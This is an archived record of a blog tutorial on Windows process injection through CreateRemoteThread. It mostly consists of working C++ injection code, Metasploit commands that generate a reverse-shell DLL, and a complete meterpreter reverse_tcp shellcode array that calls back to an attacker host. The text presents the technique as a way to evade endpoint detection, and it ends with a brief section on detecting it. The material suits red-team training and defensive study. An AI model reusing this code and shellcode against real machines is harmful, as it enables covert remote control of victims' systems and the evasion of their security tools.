{
    "id": "ae996949-b6cd-484b-9a16-0eb976a358b3",
    "created_at": "2023-01-12T15:01:19.065583Z",
    "updated_at": "2025-03-27T02:05:59.189097Z",
    "deleted_at": null,
    "sha1_hash": "bfbf606f56408c0a3ac6e048ba6660d8c27dc6b3",
    "title": "2022-04-11 - Process Injection using CreateRemoteThread API",
    "authors": "",
    "file_creation_date": "2022-05-28T19:35:50Z",
    "file_modification_date": "2022-05-28T19:35:50Z",
    "file_size": 478331,
    "plain_text": "# Process Injection using CreateRemoteThread API\n\n**tbhaxor.com/createremotethread-process-injection/**\n\nGurkirat Singh April 11, 2022\n\n[windows](https://tbhaxor.com/tag/windows/)\nCreateRemoteThread is the oldest method of process injection, and it is easily detectable.\nHowever, this establishes the foundations for process injection and code execution. This blog\npost will provide you with a thorough and practical explanation of how it works.\n\n**[Gurkirat Singh](https://tbhaxor.com/author/tbhaxor/)**\n\nApr 11, 2022 â€¢ 11 min read\n\nPhoto by [Kirill Root /](https://unsplash.com/@rootnot?utm_source=ghost&utm_medium=referral&utm_campaign=api-credit) [Unsplash](https://unsplash.com/?utm_source=ghost&utm_medium=referral&utm_campaign=api-credit)\nHello World! Malware developers work hard to prevent the detection of their code from the\nendpoint detection systems that use more advanced mechanisms to find suspicious activity\non the system. I will be discussing one of the oldest and most easily detectable methods to\nget started with process injection.\n\n\n-----\n\nProcess injection is a technique used in offensive security to circumvent the EDR detection\nby executing the program in the context of another legitimate process like svchost.exe,\nexplorer.exe or any other windows process. Since the malicious code is running in the\naddress space of the different processes it will also inherit all the privileges of the target\nprocess and can be used for privilege escalation as well. Read more about address spacing\nâ€“ [https://tbhaxor.com/understanding-address-spacing-in-detail/.](https://tbhaxor.com/understanding-address-spacing-in-detail/)\n\nWinAPI-RedBlue/Process Injection at main Â· tbhaxor/WinAPI-RedBlue\n\nSource code of exploiting windows API for red teaming series - WinAPI-RedBlue/Process\nInjection at main Â· tbhaxor/WinAPI-RedBlue\n\nGitHubtbhaxor\n\n\n-----\n\n## Understanding the Theory behind this Technique\n\nIt is very noisy to create a process directly from an image file. Normal users can see it in the\ntask manager and might kill it. The antimalware systems will kill them even before the user\nnotices. To keep the compromise off the radar, the malware developers try to run certain\npieces of code in the context of a different process. This is basically called process injection.\n\nRunning the piece of code in the different processes can give you a different set of privileges\nand access rights on the system and that can be exploited further escalate to gain access to\nthe system's highest privileged user for persistence or circumvent the detection mechanism\nin order to carry out further in the post-exploitation phase. In this post, I will show you how to\nexecute a meterpreter shellcode in the remote thread and also load the DLL and execute the\nDllMain function. If you are new to libraries, I would recommend you to read Loading DLLs\n**[using C++ in Windows andReading and Writing into the Process's Memorybefore](https://tbhaxor.com/reading-and-writing-into-processs-memory/)**\nmoving forward.\n\nThe attacker processes perform certain steps in order to successfully inject a DLL or a\nshellcode into another process memory and run a thread in that process containing the\nexecution steps of that shellcode or DLL\n\n1. Open the process handle with appropriate permissions\n2. Write the shellcode or path of DLL into the process memory\n3. Create the remote thread and provide the address or LoadLibrary function when DLL is\n\nselected or the base address of the shellcode in the remote memory\n\nðŸ’¡\n\n\n-----\n\nThe shellcode is directly executed on the system without passing through the compiler. A\nshellcode written in x64 syntax can only get executed in the 64-bit system. Similarly, the x86\nshellcode will only work in the 32-bit compatible processors. This is because of the limited\nset of instructions and the address space on the different architectures.\n\n## Injecting a DLL from Disk into the Process Memory\n\nLet's start by opening the process handle with `PROCESS_VM_WRITE |`\n```\nPROCESS_VM_OPERATION | PROCESS_CREATE_THREAD access rights that will allow us to\n\n```\nallocate the memory in the remote process and write the contents of the DLL path from the\ncurrent process address to the remote process address space and later create a thread in\nthe process from the attacker process.\n```\nHANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION |\nPROCESS_CREATE_THREAD, FALSE, dwPID);\nif (hProcess == NULL) {\n PrintError(\"OpenProcess()\", TRUE);\n return 0x1;\n}\n\n```\nOpen the process handle with sufficient access rights for process injection\nYou must be thinking about why it is required to have memory allocation and\nWriteProcessMemory operations in the first place, not just use the data from the current\nprocess? Recall, that the process can perform read and write by default to their address\nspace only. The functions we will be using are going to by default look for the addresses in\nthe target process address space. This will be later required by the `LoadLibraryA function.`\n\nTo write into the process address, you must first allocate a buffer. Let's do this with the\n```\nVirtualAllocEx function which accepts process handle to specifically perform memory\n\n```\nallocation in the remote process. After this, you need to call `WriteProcessMemory to copy`\nthe DLL path provided as the second CLI argument.\n```\nLPVOID lpBaseAddress = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT |\nMEM_RESERVE, PAGE_READWRITE);\nif (lpBaseAddress == nullptr) {\n PrintError(\"VirtualAllocEx()\", TRUE);\n return 0x0;\n}\nif (!WriteProcessMemory(hProcess, lpBaseAddress, (LPCVOID) argv[2], strlen(argv[2]),\nnullptr)) {\n PrintError(\"WriteProcessMemory()\", TRUE);\n}\n\n```\nAllocate a buffer in the remote process and copy the DLL path content\nNow to execute the instructions in the DllMain function of the library, you need to load it with\nthe `LoadLibrary function. The` `CreateRemoteThread expects an address of the routine`\nand also allows to pass the additional function arguments. Now all you need is the address\n\n\n-----\n\nof the LoadLibrary function.\n\nThe function is defined in the `Kernel32 library which is luckily mapped to the same starting`\naddress of every process while the operating system is still running. So this means that the\naddress `LoadLibraryA in process A is identical to that in process B. The concreate is not`\ndocumented in the Microsoft documentation but what I and other developers think is that\nwindows have to inject certain DLLs (Kernel32 is one of them) into every process to make\nthe program works. So mapping these DLLs to different addresses for each program will add\nanother overhead to the loader. But this address will be randomized every time Windows is\nbooted because of the Address Space Layout Randomizer.\n```\nHMODULE hKernel32 = GetModuleHandleA(\"Kernel32\");\nif (hKernel32 == NULL) {\n VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);\n lpBaseAddress = nullptr;\n CloseHandle(hProcess);\n hProcess = NULL;\n PrintError(\"GetModuleHandleA()\", TRUE);\n return 0x0;\n}\nFARPROC pLoadLibraryA = GetProcAddress(hKernel32, \"LoadLibraryA\");\n\n```\nGetting the address of the `LoadLibraryA function from the Kernel32 module`\nNow all you need is to call the `CreateRemoteThread function with process handle, address`\nto the LoadLibraryA function retrieved from the above snippet and pass the buffer\ncontaining the path of the\n```\nHANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)\npLoadLibraryA, lpBaseAddress, NULL, nullptr);\nif (hThread == NULL) {\n VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);\n lpBaseAddress = nullptr;\n CloseHandle(hProcess);\n hProcess = NULL;\n PrintError(\"CreateRemoteThread()\", TRUE);\n return 0x0;\n}\nstd::cout << \"Injected DLL\\n\";\n\n```\nStart the remote thread in the target process to load the DLL using LoadLibraryA\n\n## Creating Malicious DLL via Metasploit\n\n\n-----\n\nTo make things simpler, let s create the malicious DLL via Metasploit and use that to inject it\ninto the target process. Use the following steps in the Metasploit to create a DLL with reverse\nTCP PowerShell payload and exit function type \"Thread\"\n```\nmsf6 > use payload/windows/x64/powershell_reverse_tcp\nmsf6 payload(windows/x64/powershell_reverse_tcp) > set exitfunc thread \nexitfunc => thread\nmsf6 payload(windows/x64/powershell_reverse_tcp) > set lhost 192.168.1.7 \nlhost => 192.168.1.7\nmsf6 payload(windows/x64/powershell_reverse_tcp) > set lport 4444 \nlport => 4444\nmsf6 payload(windows/x64/powershell_reverse_tcp) > generate -f dll -o exploit.dll \n[*] Writing 8704 bytes to exploit.dll...\n\n```\nGenerating `exploit.dll in the current directory`\nThe EXITFUNC is basically the cleanup action for the payload which instructs the CPU on\nthe target system to exit gracefully. In this case, I have used thread because when the\npayload execution is no longer needed, it should call the `ExitThread() function instead of`\n```\nExitProcess(), which will terminate only the current thread created by\n\n```\nCreateRemoteThread.\n\n## Running the DLL Exploit\n\nThe application you are injecting into will be running in the different context of environment\nvariables or the current working directory. If the DLL is not found in the [search order, it will](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)\nfail and the injected one will not execute. You are supposed to pass the absolute path of the\nDLL so that it gets copied into the target process and loaded regardless of the search order.\n\nOnce the DLL is injected into the target process you can see the modules in the process\nexplorer tool containing the name and path o the\n\n\n-----\n\nThe DLL `exploit.dll is loaded into the process memory`\nYou can check out the demonstration of the above code in the following video, where a\nreverse PowerShell connection on the attacker machine is started as soon as the DLL is\ninjected into the `Notepad.exe process.`\n\n## Injecting a Shellcode into Process Memory\n\nDLL is loaded from the disk and such operations are even noisier + leave fingerprints on the\nsystem which then can be analyzed by the DFIR teams and proactively monitored by the\nEDR systems.\n\nSo what if we can somehow inject our payload in a more stealthy manner? Well as soon as\nthe program exits, the RAM is then freed and allocated to different processes. So if we can\nsomehow inject the code from memory, it can bypass more detentions and make it stealthier\nthan the DLL trick.\n\nRemember that shellcode can be directly injected from the memory and executed right away.\nSo let's first have the shellcode ready using meterpreter and then use it in the code\n```\nmsf6 > use payload/windows/x64/meterpreter/reverse_tcp\nmsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 192.168.1.7 \nlhost => 192.168.1.7\nmsf6 payload(windows/x64/meterpreter/reverse_tcp) > set exitfunc thread \nexitfunc => thread\nmsf6 payload(windows/x64/meterpreter/reverse_tcp) > generate -f c\n\n```\nCreating Reverse Meterpreter Shellcode from Metasploit\n\n\n-----\n\nIn my case, I got the following shellcode. It can be different based on your `LHOST option`\nvalue.\n```\n/*\n * windows/x64/meterpreter/reverse_tcp - 449 bytes (stage 1)\n * https://metasploit.com/\n * VERBOSE=false, LHOST=192.168.1.7, LPORT=4444, \n * ReverseAllowProxy=false, ReverseListenerThreaded=false, \n * StagerRetryCount=10, StagerRetryWait=5, PingbackRetries=0, \n * PingbackSleep=30, PayloadUUIDTracking=false, \n * EnableStageEncoding=false, StageEncoderSaveRegisters=, \n * StageEncodingFallback=true, PrependMigrate=false, \n * EXITFUNC=thread, AutoLoadStdapi=true, \n * AutoVerifySessionTimeout=30, InitialAutoRunScript=, \n * AutoRunScript=, AutoSystemInfo=true, \n * EnableUnicodeEncoding=false, SessionRetryTotal=3600, \n * SessionRetryWait=10, SessionExpirationTimeout=604800, \n * SessionCommunicationTimeout=300, PayloadProcessCommandLine=, \n * AutoUnhookProcess=false\n */\nunsigned char buf[] = \n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"\n\"\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n\"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x4d\\x31\\xc9\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\"\n\"\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\"\n\"\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x44\\x8b\"\n\"\\x40\\x20\\x50\\x49\\x01\\xd0\\x8b\\x48\\x18\\xe3\\x56\\x4d\\x31\\xc9\\x48\"\n\"\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1\"\n\"\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\"\n\"\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\"\n\"\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\"\n\"\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\"\n\"\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\"\n\"\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\"\n\"\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x07\\x41\\x54\\x49\\x89\\xe4\"\n\"\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\"\n\"\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\"\n\"\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\"\n\"\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\"\n\"\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\"\n\"\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\x49\\xff\\xce\\x75\\xe5\"\n\"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\"\n\"\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\"\n\"\\xff\\xd5\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\\x00\"\n\"\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\\x58\\xa4\"\n\"\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\xc9\\x49\\x89\"\n\"\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\"\n\"\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xe1\\x41\\xff\\xe7\";\n\n```\nShellcode generated from Metasploit to get a reverse meterpreter shell\n\n\n-----\n\n## Modifying DLL Code to Support Shellcode\n\nThe code is almost similar to the codebase of the DLL there are some tweaks to it which you\ncan find in the following diff.\n```\nINT main(INT argc, LPSTR argv[]) {\n...\n+ BYTE buf[] = {}; // add the shellcode here\n- if (argc < 3) {\n+ if (argc < 2) {\n- std::cerr << \"Usage: \" << argv[0] << \" PID /path/to/dll\\n\";\n+ std::cerr << \"Usage: \" << argv[0] << \" PID\\n\";\n...\n- LPVOID lpBuffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT |\nMEM_RESERVE, PAGE_READWRITE);\n+ LPVOID lpBuffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT |\nMEM_RESERVE, PAGE_EXECUTE_READWRITE);\n...\n- if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPCVOID)argv[2], strlen(argv[2]),\nnullptr)) {\n+ if (!WriteProcessMemory(hProcess, lpBuffer, (LPCVOID)shellcode, 449, nullptr)) {\n...\n- HMODULE hKernel32 = GetModuleHandleA(\"Kernel32\");\n- if (hKernel32 == NULL) {\n-  VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);\n-  lpBaseAddress = nullptr;\n-  CloseHandle(hProcess);\n-  hProcess = NULL;\n-  PrintError(\"GetModuleHandleA()\", TRUE);\n-  return 0x0;\n- }\n- FARPROC pLoadLibraryA = GetProcAddress(hKernel32, \"LoadLibraryA\");\n- HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL,\n(LPTHREAD_START_ROUTINE)pLoadLibraryA, lpBaseAddress, NULL, nullptr);\n+ HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL,\n(LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, nullptr);\n\n```\nAll the changes I have shown above are explained below\n\n1. Write the shellcode in the memory location of the main function to access it later while\n\nwriting in the remote process using WriteProcessMemory.\n2. Allocate the page with RWX permission because the shellcode contains raw\n\nexecutable instructions that will be executed as soon as the thread is spawned.\n3. Copy the contents of the shellcode into the memory of the remote process with the size\n\nof the payload retrieved from Metasploit (check the first line in the comment)\n4. Remove all the code for getting the base address of the LoadLibraryA function and\n\nspawn the thread with the base address of the shellcode in the remote process\nmemory. In this case, it is `lpBuffer .`\n\n## Running the Shellcode Exploit\n\n\n-----\n\nNow you have to pass only the process id of the target process to get the reverse\nmeterpreter shell on the attacker host. Before running the code, you can see there is only\none thread (aka main thread) running in the notepad process.\n\nBefore injecting into the process\nAfter executing the code, there are multiple threads created in the process one of which is\nthe one we have created via CreateRemoteThread and others are created by the second\nstage meterpreter shell.\n\n\n-----\n\nThread created after launching the payload\nIn the following demonstration video, the shellcode is injected into the notepad process.\n\n## How to Detect this Technique\n\nAs I already told this is one of the oldest techniques and can be easily detected by the\nendpoint detection mechanisms and antiviruses. Here is a catch on how it does with\ncommon sense: Usually the process creates threads into its own context and uses `memcpy`\nor `strcpy functions to perform copy operations on the memory. If a process is importing`\n[the functions, it can be retrieved from the Import Address Table.](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table)\n\nSo simply flag the binary as malicious if you find these functions: CreateRemoteThread,\n_OpenProcess, VirtualAllocEx and WriteProcessMemory. Since the legit program can also_\nuse LoadLibrary to map the required DLLs on runtime, therefore this was ignored to prevent\nfalse positives.\n\nAdditionally, you can perform the Windows API hooking on the above-mentioned functions to\ncheck when they are being called. Based on the order of execution, you can then decide\nwhether or not to flag the process and kill it.\n\n## References\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-11 - Process Injection using CreateRemoteThread API.pdf"
    ],
    "report_names": [
        "2022-04-11 - Process Injection using CreateRemoteThread API.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535679,
    "ts_updated_at": 1743041159,
    "ts_creation_date": 1653766550,
    "ts_modification_date": 1653766550,
    "files": {
        "pdf": "https://archive.orkl.eu/bfbf606f56408c0a3ac6e048ba6660d8c27dc6b3.pdf",
        "text": "https://archive.orkl.eu/bfbf606f56408c0a3ac6e048ba6660d8c27dc6b3.txt",
        "img": "https://archive.orkl.eu/bfbf606f56408c0a3ac6e048ba6660d8c27dc6b3.jpg"
    }
}